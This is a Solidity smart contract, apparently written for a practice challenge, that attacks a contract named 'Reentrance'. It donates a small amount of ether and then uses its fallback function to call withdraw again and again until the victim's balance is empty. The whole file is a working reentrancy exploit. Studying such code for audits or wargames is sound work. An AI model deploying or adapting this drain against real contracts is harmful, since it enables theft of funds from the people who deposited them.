    pragma solidity ^0.8.0;
import "./vic.sol";


contract getether{

    Reentrance public reenter;
    
    constructor(address payable _victim){
        reenter = Reentrance(_victim);
    }

    function start() public {
        reenter.donate{value : 0.001 ether, gas : 4000000}(address(this));
    
    }

    fallback() external payable {
        if(address(reenter).balance != 0){
        reenter.withdraw(0.001 ether);
        }
    }
}
